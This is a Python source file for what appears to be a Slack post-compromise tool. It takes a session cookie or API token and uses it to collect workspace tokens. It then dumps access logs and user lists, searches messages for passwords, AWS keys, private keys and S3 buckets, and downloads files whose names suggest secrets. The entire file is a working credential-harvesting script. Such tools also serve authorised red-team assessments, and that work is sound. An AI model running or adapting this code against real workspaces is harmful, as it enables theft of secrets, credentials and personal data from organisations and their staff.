#!/usr/bin/env python3

import argparse
import json
import pathlib
import random
import re
import time
import colorama
import requests
import termcolor

colorama.init()  # Initialise the colorama module - this is used to print colourful messages - life's too dull otherwise

parser = argparse.ArgumentParser(description=
                                 "This is a tool developed in Python which uses the native Slack APIs to extract "
                                 "'interesting' information from Slack Workspaces.")
parser.add_argument('--cookie', type=str, required=False, help='Slack \'d\' cookie. This flag will instruct the tool'
                                                               ' to search for Workspaces associated with the cookie.'
                                                               ' Results along with tokens will be printed to stdout')
parser.add_argument('--token', type=str, required=False, help='Slack Workspace token. The token should start with XOX.')
args = parser.parse_args()

if args.cookie is None and args.token is None:
    print(termcolor.colored("No arguments passed. Run SlackPirate.py --help ", "red"))
    exit()
elif args.cookie and args.token:
    print(termcolor.colored("You cannot use both --cookie and --token flags at the same time", "red"))
    exit()
elif args.cookie and args.token is None:
    d_cookie = dict(d=args.cookie)
elif args.token and args.cookie is None:
    token = args.token

file_user_list = "user-list.json"
file_access_logs = "access-logs.json"
file_s3 = "s3.txt"
file_credentials = "credentials.txt"
file_aws = "aws-keys.txt"
file_private_keys = "private-keys.txt"

s3_queries = ["s3.amazonaws.com", "s3://", "https://s3", "http://s3"]
credentials_queries = ["password:", "password is", "pwd", "passwd"]
aws_keys_queries = ["ASIA", "AKIA"]
private_keys_queries = ["BEGIN RSA PRIVATE", "BEGIN OPENSSH PRIVATE", "BEGIN DSA PRIVATE", "BEGIN EC PRIVATE",
                        "BEGIN PGP PRIVATE"]
interesting_files_queries = [".key", ".pem", ".ppk", ".pkcs12", ".pfx", ".p12", ".doc", ".docx",
                             ".sh", ".sql", "password", "secret", "backup"]

already_signed_in_team_regex = r"already_signed_in_team\" href=\"([a-zA-Z0-9:./-]+)"  # https://regex101.com/r/9GRaem/1
slack_api_token_regex = r"api_token: \"(xox[a-zA-Z]-[a-zA-Z0-9-]+)\""  # https://regex101.com/r/2Hz8AX/1
workspace_valid_emails_regex = r"email-domains-formatted=\"(@.+?)[\"]"  # https://regex101.com/r/cSZW0G/1
private_keys_regex = r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)"  # https://regex101.com/r/jWrF8F/2
s3_regex = r"([a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com|s3://[a-zA-Z0-9-\.\_]+|s3-[a-zA-Z0-9-\.\_\/]+|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+)"  # https://regex101.com/r/6bLaKj/8
credentials_regex = r"(?i)(password\s*[`=:\"]+\s*[^\s]+|password is\s*[`=:\"]+\s*[^\s]+|pwd\s*[`=:\"]+\s*[^\s]+|passwd\s*[`=:\"]+\s*[^\s]+)"  # https://regex101.com/r/DoPV1M/1
aws_keys_regex = r"(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])"  # https://regex101.com/r/IEq5nU/2


def is_rate_limited(r):
    if r['ok'] is False and r['error'] == 'ratelimited':
        print(termcolor.colored("INFO: Slack API rate limit hit - sleeping for 60 seconds", "blue"))
        time.sleep(60)
    else:
        return


def is_cookie_flag_set():
    if args.cookie:
        try:
            r = requests.get("https://a.slack.com", cookies=d_cookie)
            already_signed_in_match = re.findall(already_signed_in_team_regex, str(r.content))
            if already_signed_in_match:
                print(termcolor.colored("This cookie has access to the following Workspaces: \n", "blue"))
                for workspace in already_signed_in_match:
                    r = requests.get(workspace, cookies=d_cookie)
                    regex_tokens = re.findall(slack_api_token_regex, str(r.content))
                    for slack_token in regex_tokens:
                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token, "green"))

            else:
                print(termcolor.colored("No workspaces were found for this cookie", "red"))
                exit()
        except requests.exceptions.RequestException as exception:
            print(termcolor.colored(exception, "red"))
        exit()


def check_token_validity():
    global output_directory
    global slack_workspace
    try:
        r = requests.post(
            "https://slack.com/api/auth.test?token=" + token + "&pretty=1",
            headers={'Authorization': 'Bearer ' + token}).json()
        if str(r['ok']) == 'True':
            output_directory = str(r['team'])
            slack_workspace = str(r['url'])
            print(termcolor.colored("INFO: Token looks valid! URL: " + str(r['url']) + " User: " + str(r['user']), "blue"))
            print(termcolor.colored("\n"))
            pathlib.Path(output_directory).mkdir(parents=True,
                                                 exist_ok=True)  # create files directory to keep things tidy
        else:
            print(termcolor.colored("ERR: Token not valid. Slack error: " + str(r['error']), "red"))
            exit()
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))


def print_interesting_information():
    try:
        r = requests.get(slack_workspace)
        team_domains_match = re.findall(workspace_valid_emails_regex, str(r.content))
        for domain in team_domains_match:
            print(termcolor.colored("INFO: The following domains can be used on this Slack Workspace: " + domain, "blue"))
            print(termcolor.colored("\n"))
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))


def dump_team_access_logs():
    print(termcolor.colored("START: Attempting download Workspace access logs", "blue"))
    try:
        r = requests.get(
            "https://slack.com/api/team.accessLogs?token=" + token + "&pretty=1&count=1000").json()
        is_rate_limited(r)
        if str(r['ok']) == 'True':
            for value in r['logins']:
                with open(output_directory + '/' + file_access_logs, 'a') as outfile:
                    json.dump(value, outfile, indent=4, sort_keys=True, ensure_ascii=False)
        else:
            print(termcolor.colored("END: Unable to dump access logs (this is normal if you don't have a privileged token on a non-free Workspace). Slack error: " + str(r['error']), "blue"))
            print(termcolor.colored("\n"))
            return
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(termcolor.colored("END: Successfully dumped access logs! Filename: ./" + output_directory + "/" + file_access_logs, "green"))
    print(termcolor.colored("\n"))


def dump_user_list():
    print(termcolor.colored("START: Attempting to download Workspace user list", "blue"))
    pagination_cursor = ''  # virtual pagination - apparently this is what the cool kids do these days :-)
    try:
        r = requests.get(
            "https://slack.com/api/users.list?token=" + token + "&pretty=1&limit=1&cursor=" + pagination_cursor).json()
        is_rate_limited(r)
        if str(r['ok']) == 'False':
            print(termcolor.colored("END: Unable to dump the user list. Slack error: " + str(r['error']), "yellow"))
            print(termcolor.colored("\n"))
        else:
            pagination_cursor = r['response_metadata']['next_cursor']
            while str(r['ok']) == 'True' and pagination_cursor:
                r = requests.get(
                    "https://slack.com/api/users.list?token=" + token + "&pretty=1&limit=900&cursor=" + pagination_cursor).json()
                for value in r['members']:
                    pagination_cursor = r['response_metadata']['next_cursor']
                    with open(output_directory + '/' + file_user_list, 'a') as outfile:
                        json.dump(value, outfile, indent=4, sort_keys=True, ensure_ascii=True)
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(termcolor.colored("END: Successfully dumped user list! Filename: ./" + output_directory + "/" + file_user_list, "green"))
    print(termcolor.colored("\n"))


def find_s3():
    print(termcolor.colored("START: Attempting to find references of S3 buckets", "blue"))
    pagination = {}

    try:
        for query in s3_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(page)).json()
                regex_results = re.findall(s3_regex, str(r))
                with open(output_directory + '/' + file_s3, 'a') as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
        print(termcolor.colored("\n"))
    print(termcolor.colored("END: If any S3 buckets were found, they will be here: ./" + output_directory + "/" + file_s3, "green"))
    print(termcolor.colored("\n"))


def find_credentials():
    print(termcolor.colored("START: Attempting to find references to credentials", "blue"))
    pagination = {}

    try:
        for query in credentials_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page)).json()
                regex_results = re.findall(credentials_regex, str(r))
                with open(output_directory + '/' + file_credentials, 'a') as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(termcolor.colored(
        "END: If any credentials were found, they will be here: ./" + output_directory + "/" + file_credentials, "green"))
    print(termcolor.colored("\n"))


def find_aws_keys():
    print(termcolor.colored("START: Attempting to find references to AWS keys", "blue"))
    pagination = {}

    try:
        for query in aws_keys_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page)).json()
                regex_results = re.findall(aws_keys_regex, str(r))
                with open(output_directory + '/' + file_aws, 'a') as log_output:
                    for item in set(regex_results):
                        log_output.write(item + "\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(termcolor.colored("END: If any AWS keys were found, they will be here: ./" + output_directory + "/" + file_aws, "green"))
    print(termcolor.colored("\n"))


def find_private_keys():
    print(termcolor.colored("START: Attempting to find references to private keys", "blue"))
    pagination = {}

    try:
        for query in private_keys_queries:
            r = requests.get(
                "https://slack.com/api/search.messages?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
            is_rate_limited(r)
            pagination[query] = (r['messages']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                r = requests.get(
                    "https://slack.com/api/search.messages?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(
                        page)).json()
                regex_results = re.findall(private_keys_regex, str(r))
                remove_new_line_char = [w.replace('\\n', '\n') for w in regex_results]
                with open(output_directory + '/' + file_private_keys, 'a') as log_output:
                    for item in set(remove_new_line_char):
                        log_output.write(item + "\n\n")
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(termcolor.colored(
        "END: If any private keys were found, they will be here: ./" + output_directory + "/" + file_private_keys, "green"))
    print(termcolor.colored("\n"))


def download_interesting_files():
    print(termcolor.colored("START: Attempting to download interesting files (this may take some time)", "blue"))
    pathlib.Path(output_directory + '/downloads').mkdir(parents=True,
                                                        exist_ok=True)  # create files directory to keep things tidy
    bad_characters = "/\\:*?\"<>|"  # Windows doesn't like these characters. Guess how I found out.
    strip_bad_characters = str.maketrans(bad_characters, '_________')  # Replace bad characters with an underscore
    pagination = {}

    try:
        for query in interesting_files_queries:
            r = requests.get(
                "https://slack.com/api/search.files?token=" + token + "&query=\"" + query + "\"""&pretty=1&count=100").json()
            is_rate_limited(r)
            pagination[query] = (r['files']['pagination']['page_count'])

        for key, value in pagination.items():
            page = 1
            while page <= value:
                is_rate_limited(r)
                r = requests.get(
                    "https://slack.com/api/search.files?token=" + token + "&query=\"" + key + "\"""&pretty=1&count=100&page=" + str(page)).json()
                for file in r['files']['matches']:
                    file_name = file['name']
                    r = requests.get(file['url_private'], headers={'Authorization': 'Bearer ' + token})
                    open(output_directory + '/downloads/' + str(random.randint(0, 999)) + ' ' + file_name.translate(
                        strip_bad_characters), 'wb').write(r.content)
                page += 1
    except requests.exceptions.RequestException as exception:
        print(termcolor.colored(exception, "red"))
    print(
        termcolor.colored("END: Downloaded files (if any were found) will be found in: ./" + output_directory + "/downloads",
                          "green"))
    print(termcolor.colored("\n"))


is_cookie_flag_set()

check_token_validity()

print_interesting_information()

dump_team_access_logs()

dump_user_list()

find_s3()

find_credentials()

find_aws_keys()

find_private_keys()

download_interesting_files()
